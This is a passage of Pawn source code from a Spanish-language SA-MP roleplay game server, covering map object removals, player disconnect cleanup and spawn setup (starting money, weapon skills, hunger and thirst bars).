	RemoveBuildingForPlayer(playerid, 2756, 1712.5469, -1663.4688, 21.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 2757, 1715.6250, -1663.4688, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2758, 1715.5781, -1663.4688, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2759, 1715.6797, -1663.4688, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2760, 1715.7656, -1663.4688, 21.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2761, 1716.2969, -1663.4688, 21.1563, 0.25);
	//Meses interior puticlub 2 Brothel 2
	RemoveBuildingForPlayer(playerid, 2024, 960.2500, -58.0625, 1000.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 2118, 960.8672, -45.6484, 1000.5234, 0.25);
	//Taller gasolinera
	RemoveBuildingForPlayer(playerid, 4976, 1931.0000, -1871.3906, 15.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 1904.3750, -1879.7344, 13.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 1909.6563, -1879.7344, 13.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 1914.9297, -1879.7344, 13.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 1920.1953, -1879.9531, 13.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 1413, 1925.4609, -1879.9609, 13.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 1930.7188, -1879.7344, 13.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 4848, 1931.0000, -1871.3906, 15.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1931.8750, -1863.4609, 16.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1915.7422, -1863.4609, 16.3203, 0.25);
	//Groove
	RemoveBuildingForPlayer(playerid, 947, 2533.8828, -1667.5781, 16.2891, 0.25);
	RemoveBuildingForPlayer(playerid, 3593, 2437.4844, -1644.1172, 12.9844, 0.25);
	//Cancha Idlewood
	RemoveBuildingForPlayer(playerid, 5551, 2140.5156, -1735.1406, 15.8906, 0.25);
	RemoveBuildingForPlayer(playerid, 5410, 2140.5156, -1735.1406, 15.8906, 0.25);
	//MC Willowfield
	RemoveBuildingForPlayer(playerid, 620, 2114.5547, -1928.1875, 5.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2113.3984, -1925.0391, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2115.6719, -1922.7656, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2123.3594, -1928.0703, 6.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2122.6563, -1916.7891, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2116.9297, -1916.0781, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2121.5078, -1909.5313, 10.8047, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2110.2734, -1906.5859, 5.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 2110.2734, -1906.5859, 5.0313, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 2118.2891, -1939.3984, 16.3906, 0.25);
	//Skatepark
	RemoveBuildingForPlayer(playerid, 5400, 1913.1328, -1370.5000, 17.7734, 0.25);
	//Chinatown
	RemoveBuildingForPlayer(playerid, 1226, 1458.4063, -1876.6875, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1450.5547, -1868.0078, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1483.4297, -1867.7188, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1504.7109, -1876.6875, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1547.5391, -1868.0078, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1593.9844, -1867.7188, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 642, 1561.7969, -1894.7578, 13.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 643, 1561.8203, -1894.7188, 12.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1566.1797, -1893.1016, 13.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1573.4531, -1893.1016, 13.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 642, 1573.9766, -1894.8281, 13.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 643, 1574.0000, -1894.7891, 12.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 642, 1561.7969, -1889.8906, 13.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 643, 1561.8203, -1889.8594, 12.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1566.1797, -1887.3438, 13.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 642, 1561.6250, -1884.8672, 13.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 643, 1561.6484, -1884.8281, 12.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1573.4531, -1887.3438, 13.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 643, 1574.0000, -1889.9453, 12.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 642, 1573.9766, -1889.9844, 13.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 642, 1574.0156, -1884.9531, 13.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 643, 1574.0391, -1884.9219, 12.8672, 0.25);
	//Colinas
	RemoveBuildingForPlayer(playerid, 3341, 2285.3438, -1044.3438, 48.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 3170, 2285.3438, -1044.3438, 48.4375, 0.25);
	//Unity
	RemoveBuildingForPlayer(playerid, 1226, 1843.7656, -1875.8672, 16.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1724.8750, -1859.5391, 16.3516, 0.25);
	//Taller Willowfield
	RemoveBuildingForPlayer(playerid, 3244, 2532.0313, -2074.6250, 12.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 3290, 2503.1250, -2073.3750, 12.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 3290, 2515.4219, -2073.3750, 12.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 3567, 2446.8281, -2075.8438, 13.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 3567, 2438.3594, -2075.8438, 13.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 3256, 2515.4219, -2073.3750, 12.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 3256, 2503.1250, -2073.3750, 12.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 3256, 2503.1250, -2073.3750, 12.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 3686, 2448.1328, -2075.6328, 16.0469, 0.25);
	RemoveBuildingForPlayer(playerid, 3627, 2448.1328, -2075.6328, 16.0469, 0.25);
	//Taller unity
	RemoveBuildingForPlayer(playerid, 1226, 1957.3672, -1867.2891, 16.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 4983, 1961.0313, -1871.4063, 23.7734, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1957.3672, -1867.2891, 16.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, 1952.0313, -1862.9297, 11.5156, 0.25);
	//Planta taxis unity
	RemoveBuildingForPlayer(playerid, 5024, 1748.8438, -1883.0313, 14.1875, 0.25);
	//Parque Verona
	RemoveBuildingForPlayer(playerid, 6208, 954.2734, -1720.7969, 20.7734, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 932.3203, -1751.1172, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 932.4688, -1709.7266, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 933.2578, -1731.4844, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 939.7109, -1761.0000, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 937.2656, -1696.8359, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 6205, 954.2734, -1720.7969, 20.7734, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 960.1563, -1764.6953, 15.2188, 0.25);
	//Urbanización ayuntamiento
	RemoveBuildingForPlayer(playerid, 4055, 1394.3594, -1620.6641, 32.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 4220, 1370.6406, -1643.4453, 33.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1378.8125, -1623.3828, 14.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1379.2422, -1622.4531, 12.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1375.6406, -1621.8672, 14.5859, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1382.0469, -1621.8672, 14.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 4006, 1394.3594, -1620.6641, 32.1484, 0.25);
	//Desguace afueras de LS
	RemoveBuildingForPlayer(playerid, 1438, -88.1094, -1598.7188, 1.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1370, -86.5703, -1595.1406, 2.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 3173, -93.0938, -1593.5234, 1.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 1462, -93.6797, -1588.0781, 1.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 3174, -75.1719, -1596.3047, 1.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 1438, -79.2578, -1593.4688, 1.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1370, -72.4141, -1596.7734, 2.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 1370, -74.1875, -1583.9922, 2.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 3175, -101.8203, -1577.6875, 1.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 1457, -91.0156, -1576.6250, 3.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 1370, -100.8203, -1580.4219, 2.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 1438, -93.2109, -1569.4844, 1.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 3175, -77.9375, -1581.3125, 1.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 1472, -75.5859, -1581.0703, 2.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 727, -73.8203, -1569.1719, 1.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 3173, -90.6406, -1562.9375, 1.5547, 0.25);
	RemoveBuildingForPlayer(playerid, 1438, -77.0625, -1542.6016, 1.6172, 0.25);
	RemoveBuildingForPlayer(playerid, 1457, -71.0000, -1574.0859, 3.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 3175, -64.3828, -1572.2109, 1.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 1438, -62.2734, -1569.2891, 1.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1370, -61.6641, -1573.4609, 2.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 1438, -56.0625, -1575.6563, 1.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 1370, -64.0000, -1550.2578, 2.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 3175, -55.2813, -1557.4531, 1.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 1370, -56.1563, -1560.4609, 2.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 727, -49.3984, -1560.0078, 1.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 3174, -44.2891, -1561.3125, 1.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 1370, -43.7422, -1563.6875, 2.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 3173, -67.2344, -1544.2188, 1.5547, 0.25);
	//Coche groove
	RemoveBuildingForPlayer(playerid, 3594, 2514.3906, -1658.6016, 13.1406, 0.25);
	//Pay spray LV
	RemoveBuildingForPlayer(playerid, 3294, -1420.5469, 2591.1563, 57.7422, 0.25);
    return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
    new Nombre[MAX_PLAYER_NAME], salida[100 + MAX_PLAYER_NAME];
    format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
    if(PlayerInfo[playerid][pAdmin] == 0 && GetPlayerState(playerid) != PLAYER_STATE_SPECTATING)
    {
    	if(reason == 0){format(salida, sizeof(salida), "%s se ha desconectado del servidor. (Crash / Caida)", Nombre); ProxDetector(30.0, playerid, salida, Blanco,Blanco,Gris,Gris,GrisOscuro); printf("%s", salida);}
    	else if(reason == 1){format(salida, sizeof(salida), "%s se ha desconectado del servidor. (Voluntariamente)", Nombre); ProxDetector(30.0, playerid, salida, Blanco,Blanco,Gris,Gris,GrisOscuro); printf("%s", salida);}
    	else if(reason == 2){format(salida, sizeof(salida), "%s se ha desconectado del servidor. (Kickeado / Baneado)", Nombre); ProxDetector(30.0, playerid, salida, Blanco,Blanco,Gris,Gris,GrisOscuro); printf("%s", salida);}
	}
	
	for(new i = 0; i < MAX_LSEDINFORMES; i++) //Informes LSED
	{
	    if(InformeEmergencias[i][ieJugador] == playerid)
		{
			InformeEmergencias[i][ieEstado] = NOEXISTE;
			for(new j = 0; j < MAX_PLAYERS; j++)
			{
			    if(AtendiendoInforme[j] == playerid)
			    {
			        DisablePlayerCheckpoint(j);
			        SendClientMessage(j, Rojo, "(( Informe eliminado. Razón: El jugador se ha desconectado.))");
				}
			}
			break;
		}
	}

    for(new x=0; x<MAX_PLAYERS; x++) //Sistema RECON
    {
        if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][pSpecID] == playerid)
        AdvanceSpectate(x);
    }
    
    for(new i=0; i<MAX_PLAYERS; i++) //Sistema multas
    {
        if(Multador[i] == playerid){Multador[i] = NOEXISTE, MultaPrecio[i] = 0;}
    }
    
    for(new i=0; i<MAX_PLAYERS; i++) //Job taxista
    {
        if(TaxiConductor[i] == playerid){TaxiConductor[i] = NOEXISTE;}
        if(TaxiPasajero[i] == playerid){TaxiPasajero[i] = NOEXISTE;}
    }
    
    for(new i=0; i<MAX_PLAYERS; i++) //Job mecánico
    {
        if(ReparacionMeca[i] == playerid){ReparacionMeca[i] = NOEXISTE; ReparacionTipo[i] = 0; ReparacionPrecio[i] = 0;}
    }
    
    for(new i=0; i<MAX_PLAYERS; i++) //Job mecánico
    {
        if(RepintadoMeca[i] == playerid){RepintadoMeca[i] = NOEXISTE; RepintadoColor1[i] = 0; RepintadoColor2[playerid] = 0; RepintadoPrecio[i] = 0;}
    }

	for(new i=0; i<MAX_PLAYERS; i++) //Taller mecánico
    {
        if(Contratador[i] == playerid){Contratador[i] = NOEXISTE; Contrato[i] = 0;}
    }
    
    KillTimer(ToqueLlamadaTimer[playerid]); //Sistema teléfono
    if(PersonaEnLlamada[playerid] != NOEXISTE)KillTimer(ToqueLlamadaTimer[PersonaEnLlamada[playerid]]);
    if(EnLlamada[playerid] == 3)
	{
		KillTimer(CostoLlamadaTimer[playerid]);
		PlayerInfo[playerid][pDineroBanco] -= CosteTotalLlamada[playerid];
		CosteTotalLlamada[playerid] = 0;
	}
	if(PersonaEnLlamada[playerid] != NOEXISTE)
	{
	    if(EnLlamada[PersonaEnLlamada[playerid]] == 3)
		{
		    new string[128];
			KillTimer(CostoLlamadaTimer[PersonaEnLlamada[playerid]]);
			format(string, sizeof(string), "Coste de la llamada: %d$", CosteTotalLlamada[PersonaEnLlamada[playerid]]);
			SendClientMessage(PersonaEnLlamada[playerid], RojoIntenso, string);
			PlayerInfo[PersonaEnLlamada[playerid]][pDineroBanco] -= CosteTotalLlamada[PersonaEnLlamada[playerid]];
			CosteTotalLlamada[PersonaEnLlamada[playerid]] = 0;
		}
	}
    for(new i=0; i<MAX_PLAYERS; i++)
    {
        if(PersonaEnLlamada[i] == playerid){SendClientMessage(i, Gris, "Se ha cortado la línea..."); EnLlamada[i] = 0; PersonaEnLlamada[i] = NOEXISTE; break;}
    }
    
    for(new i=0; i<MAX_PLAYERS; i++) //Sistema venta de vehículos a otras personas
    {
        if(VenderVehAVendedor[i] == playerid){VenderVehAVendedor[i] = NOEXISTE, VenderVehAPrecio[i] = 0, VenderVehALlave[i] = 0;}
    }
    
    if(PlayerInfo[playerid][pMuerto] > 0) //Sistema muerte
    {
	    KillTimer(MuertoTimer[playerid]);
		KillTimer(MuertoFlashTimer[playerid]);
    }
    
    if(MatriculasActivadas[playerid] == 1) //Sistema matrículas
    {
	    for(new i; i < MAX_VEHICLES; i++)
		{
			DeletePlayer3DTextLabel(playerid, MatriculasCoches[playerid][i]);
		}
	}
    
    if(AdminDuty[playerid] > 0)
    {
		SetPlayerName(playerid, PlayerInfo[playerid][pNombre]);
    }
    
    KillTimer(AFKTimer[playerid]); //Sistema anti afk
    
    DestroyPlayerProgressBar(playerid, hambrebar[playerid]);
    DestroyPlayerProgressBar(playerid, sedbar[playerid]);

    PlayerSave(playerid); //Guardar stats
    if(reason == 0) //Si se le cae la conexión
    {
        Anims_OnPlayerConnect(playerid);

	    ResetPlayerVars(playerid); //Resetea todas las variables del jugador
	    DestroyDynamic3DTextLabel(Yo3DText[playerid]);

	    SetPlayerColor(playerid,Blanco2); //Cambia el color del jugador a transparente
    }
    return 1;
}

public OnPlayerSpawn(playerid)
{
    if(JugadorLogueado[playerid] == 0 || !IsPlayerConnected(playerid)){Kick(playerid); return 1;}
    SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, PlayerInfo[playerid][pHabPistola]);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, PlayerInfo[playerid][pHabSD]);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, PlayerInfo[playerid][pHabDEagle]);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, PlayerInfo[playerid][pHabEscopeta]);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, PlayerInfo[playerid][pHabSawnoff]);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_SPAS12_SHOTGUN, PlayerInfo[playerid][pHabEscopetaCom]);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, PlayerInfo[playerid][pHabUZI]);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, PlayerInfo[playerid][pHabMP5]);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, PlayerInfo[playerid][pHabAK47]);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, PlayerInfo[playerid][pHabM4]);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_SNIPERRIFLE, PlayerInfo[playerid][pHabFranco]);
    CargarAgenda(playerid); //Cargar agenda
 	MostrarTurfs(playerid); //Mostrar turfs
 	//Sistema hambre y sed
    TextDrawShowForPlayer(playerid, hambre[playerid]); //Textdraws hambre y sed
    TextDrawShowForPlayer(playerid, sed[playerid]);

    hambrebar[playerid] = CreatePlayerProgressBar(playerid, 519.000000, 106.000000, 79.500000, 0.200000, Naranja, MAX_HAMBRE);
    ShowPlayerProgressBar(playerid, hambrebar[playerid]);
    if(PlayerInfo[playerid][pPrimerLogueo] != 0) ActualizarHambre(playerid); //Actualizar hambre si no es primera vez que loguea

    sedbar[playerid] = CreatePlayerProgressBar(playerid, 519.000000, 122.000000, 79.500000, 0.200000, AguamarinaOscuro, MAX_SED);
    ShowPlayerProgressBar(playerid, sedbar[playerid]);
    if(PlayerInfo[playerid][pPrimerLogueo] != 0)  ActualizarSed(playerid); //Actualizar sed si no es primera vez que loguea
    
    new hora, minuto; //Da tiempo y hora del servidor
    SetPlayerWeather(playerid, DefaultWeather);
	gettime(hora, minuto);
	SetPlayerTime(playerid, hora+ahora, minuto);

						
    if(PlayerInfo[playerid][pPrimerLogueo] == 0) //Primera vez que loguea
    {
	    SetPlayerVirtualWorld(playerid, 0);
	    PlayerInfo[playerid][pDineroBanco] = 1500;
	    ResetPlayerMoneyAC(playerid);
	    GivePlayerMoneyAC(playerid, 1500);
	    PlayerInfo[playerid][pPrimerLogueo] = 1;
	    switch(PlayerInfo[playerid][pPrimerLugarSpawn])
	    {
		    case 0:
		    {
		        SendClientMessage(playerid, AmarilloClaro, "Ahora estás en Unity Station, tienes 1500$ en la cartera y 1500$ en tu cuenta bancaria.");
		    	SetPlayerFacingAngle(playerid, 0);
		    	SetPlayerPos(playerid,1742.8489,-1860.8014,13.5783);
		    }
		    case 1:
		    {
		        SendClientMessage(playerid, AmarilloClaro, "Ahora estás en Market Station, tienes 1500$ en la cartera y 1500$ en tu cuenta bancaria.");
		    	SetPlayerFacingAngle(playerid, 90);
		    	SetPlayerPos(playerid,820.0490,-1341.7220,13.5225);
		    }
		    case 2:
		    {
		        SendClientMessage(playerid, AmarilloClaro, "Ahora estás en el Aeropuerto de LS, tienes 1500$ en la cartera y 1500$ en tu cuenta bancaria.");
		    	SetPlayerFacingAngle(playerid, 180);
		    	SetPlayerPos(playerid,1642.4363,-2238.0662,13.4979);
		    }
		    case 3:
		    {
		        SendClientMessage(playerid, AmarilloClaro, "Ahora estás en el Ayuntamiento, tienes 1500$ en la cartera y 1500$ en tu cuenta bancaria.");
		    	SetPlayerFacingAngle(playerid, 0);
		    	SetPlayerPos(playerid,1481.1447,-1742.8448,13.5469);
		    }
		    default:
		    {
		        SendClientMessage(playerid, AmarilloClaro, "Ahora estás en Unity Station, tienes 1500$ en la cartera y 1500$ en tu cuenta bancaria.");
		    	SetPlayerFacingAngle(playerid, 0);
		    	SetPlayerPos(playerid,1742.8489,-1860.8014,13.5783);
		    }
	    }
	    SendClientMessage(playerid, AmarilloClaro, "Necesitas un lugar donde residir y un trabajo, busca en la ciudad para ello.");
    	SendClientMessage(playerid, Amarillo, "¡Buena suerte en tu viaje!");
    	
    	SendClientMessage(playerid, Verde, "Has recbido 1500$ adicionales en tu cuenta bancaria.");
    	PlayerInfo[playerid][pDineroBanco] += 1500;
	    	
	    SetCameraBehindPlayer(playerid);
	    SetPlayerInterior(playerid,0);
	    SetPlayerVirtualWorld(playerid,0);
	    TogglePlayerControllable(playerid, 1);
	    PrimerSpawn[playerid] = 1;
	    PlayerInfo[playerid][pSkin] = 2;
	    PlayerInfo[playerid][pNivel] = 1;
        for(new x = 0; x < 8; x++)
	    {
		    PlayerInfo[playerid][pBol][x] = 0;
		    PlayerInfo[playerid][pBolCant][x] = 0;
	    }
	    PlayerInfo[playerid][pManoIzq] = 0;
	    PlayerInfo[playerid][pManoIzqCant] = 0;
	    PlayerInfo[playerid][pManoDer] = 0;
	    PlayerInfo[playerid][pManoDerCant] = 0;
	    PlayerInfo[playerid][pEspalda] = 0;
	    PlayerInfo[playerid][pEspaldaCant] = 0;
	    
	    PlayerInfo[playerid][pHabPistola] = 800;
	    PlayerInfo[playerid][pHabSD] = 1000;
	    PlayerInfo[playerid][pHabDEagle] = 1000;
	    PlayerInfo[playerid][pHabEscopeta] = 1000;
	    PlayerInfo[playerid][pHabSawnoff] = 800;
	    PlayerInfo[playerid][pHabEscopetaCom] = 1000;
	    PlayerInfo[playerid][pHabUZI] = 800;
	    PlayerInfo[playerid][pHabMP5] = 1000;
	    PlayerInfo[playerid][pHabAK47] = 1000;
	    PlayerInfo[playerid][pHabM4] = 1000;
	    PlayerInfo[playerid][pHabFranco] = 1000;
	    SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, PlayerInfo[playerid][pHabPistola]);
	    SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, PlayerInfo[playerid][pHabSD]);
	    SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, PlayerInfo[playerid][pHabDEagle]);
	    SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, PlayerInfo[playerid][pHabEscopeta]);
	    SetPlayerSkillLevel(playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, PlayerInfo[playerid][pHabSawnoff]);
	    SetPlayerSkillLevel(playerid, WEAPONSKILL_SPAS12_SHOTGUN, PlayerInfo[playerid][pHabEscopetaCom]);
	    SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, PlayerInfo[playerid][pHabUZI]);
	    SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, PlayerInfo[playerid][pHabMP5]);
	    SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, PlayerInfo[playerid][pHabAK47]);
	    SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, PlayerInfo[playerid][pHabM4]);
	    SetPlayerSkillLevel(playerid, WEAPONSKILL_SNIPERRIFLE, PlayerInfo[playerid][pHabFranco]);
    
        PlayerInfo[playerid][pHambre] = 240;
        ActualizarHambre(playerid);
        PlayerInfo[playerid][pSed] = 180;
        ActualizarSed(playerid);
        
		if(PlayerInfo[playerid][pPrimeraMejora] == 1)
		{
			PlayerInfo[playerid][pLicConduccion] = 1; //Mejora de carné de conducir
			SendClientMessage(playerid, Verde, "¡Has recibido el carné de conducir!");
		}
		
		PlayerInfo[playerid][pFuerza] = 100;
		if(PlayerInfo[playerid][pPrimeraMejora] == 2)
		{
			PlayerInfo[playerid][pFuerza] = 150; //Mejora de +0.5 de fuerza
			SendClientMessage(playerid, Verde, "¡Has recibido +0.5 de fuerza!");
		}
		
		if(PlayerInfo[playerid][pPrimeraMejora] == 3)
		{
			PlayerInfo[playerid][pExp] += 5; //Mejora de +5 exp
			SendClientMessage(playerid, Verde, "¡Has recibido +5 de Exp!");
		}
        
		TogglePlayerControllable(playerid, 0);
		SetCameraBehindPlayer(playerid);
		SetTimerEx("SobeitCheck", 4000, 0, "i", playerid);
		SetTimerEx("Descongelar", 5000, false, "i", playerid);
		AFKTimer[playerid] = SetTimerEx("AntiAFK", 600000, true, "i", playerid);
    }
    else if(PlayerInfo[playerid][pPrimerLogueo] != 0) //No es primera vez que loguea
    {
        SetPlayerPos(playerid, 2002.5728, -1445.3669, 13.5616); //Spawnea en hospital de Jefferson
	    if(PrimerSpawn[playerid] == 0) //Primera vez que spawnea tras loguear
	    {
            SetPlayerInterior(playerid, PlayerInfo[playerid][pInterior]);
	        SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pVirtualWorld]);
	        new Float:PosX, Float:PosY, Float:PosZ;
	        PosX = PlayerInfo[playerid][pPosX]; PosY = PlayerInfo[playerid][pPosY]; PosZ = PlayerInfo[playerid][pPosZ];
	        SetPlayerPos(playerid,PosX, PosY, PosZ);
	        SetPlayerHealth(playerid, PlayerInfo[playerid][pVida]);
	        SetPlayerArmour(playerid, PlayerInfo[playerid][pChaleco]);
	        new ManoDer = PlayerInfo[playerid][pManoDer];
	        new ManoIzq = PlayerInfo[playerid][pManoIzq];
	        new Espalda = PlayerInfo[playerid][pEspalda];
	        if(ManoDer > 0) //Si tiene algo en la mano derecha
			{
				PonerObjeto(playerid, 1, ManoDer);
				if(ObjetoInfo[ManoDer][IDArma] > 0) //Es un arma
				{
					GivePlayerWeapon(playerid, ObjetoInfo[ManoDer][IDArma], PlayerInfo[playerid][pManoDerCant]); //Le da el arma
				}
			}
	        if(ManoIzq > 0){PonerObjeto(playerid, 2, ManoIzq);} //Si tiene algo en la mano izquierda
	        if(Espalda > 0){PonerObjeto(playerid, 3, Espalda);} //Si tiene algo en la espalda
	        PrimerSpawn[playerid] = 1;
	        TogglePlayerControllable(playerid, 0);
	        SetCameraBehindPlayer(playerid);
	        SetTimerEx("SobeitCheck", 4000, 0, "i", playerid);
			SetTimerEx("Descongelar", 5000, false, "i", playerid);
			if(PlayerInfo[playerid][pDrConsumida][0] > 0) SendClientMessage(playerid, Naranja, "Recuerda que aún estás bajo los efectos de la marihuana.");
			if(PlayerInfo[playerid][pDrConsumida][1] > 0) SendClientMessage(playerid, Naranja, "Recuerda que aún estás bajo los efectos de la cocaína.");
			if(PlayerInfo[playerid][pDrConsumida][2] > 0) SendClientMessage(playerid, Naranja, "Recuerda que aún estás bajo los efectos del crack.");
			if(PlayerInfo[playerid][pDrConsumida][3] > 0) SendClientMessage(playerid, Naranja, "Recuerda que aún estás bajo los efectos de la heroína.");
			if(PlayerInfo[playerid][pDrConsumida][4] > 0) SendClientMessage(playerid, Naranja, "Recuerda que aún estás bajo los efectos del LSD.");
			AFKTimer[playerid] = SetTimerEx("AntiAFK", 600000, true, "i", playerid);
	    }
	    if(PlayerInfo[playerid][pEncarcelado] == 3) //Si está jail OOC
		{
		    JailPlayerOOC(playerid);
		}
		if(PlayerInfo[playerid][pMuerto] > 0)
		{
			SetPlayerPos(playerid, MuertoX[playerid], MuertoY[playerid], MuertoZ[playerid]);
   			SetPlayerInterior(playerid, MuertoInt[playerid]), SetPlayerVirtualWorld(playerid, MuertoVW[playerid]);
			TogglePlayerControllable(playerid, 0);
			SendClientMessage(playerid,NaranjaOscuro,"Te has desmayado debido a las heridas.");
	    	if(PlayerInfo[playerid][pEncarcelado] == 0)SendClientMessage(playerid,NaranjaOscuro,"Si no eres reanimado en 3 minutos perderás 1000$ y 2 puntos de EXP.");
	   	 	SetTimerEx("Congelar", 100, false, "i", playerid);
	    	MuertoTimer[playerid] = SetTimerEx("Muerto", 180000, false, "i", playerid);
	    	MuertoFlashTimer[playerid] = SetTimerEx("MuertoFlash", 153000, false, "i", playerid);
		}
		if(Muerte[playerid] == 1) //Si ha muerto cerca del hospital de Market
		{
			SetPlayerPos(playerid, 1182.8728, -1323.5931, 13.5783);
			SetPlayerFacingAngle(playerid, 270);
			Muerte[playerid] = 0;
		    JailPlayerIC(playerid);
		}
		if(Muerte[playerid] == 2) //Si ha muerto cerca del hospital de Jefferson
		{
			SetPlayerPos(playerid, 2002.5728, -1445.3669, 13.5616);
			SetPlayerFacingAngle(playerid, 135);
			Muerte[playerid] = 0;
		   	JailPlayerIC(playerid);
		}
    }
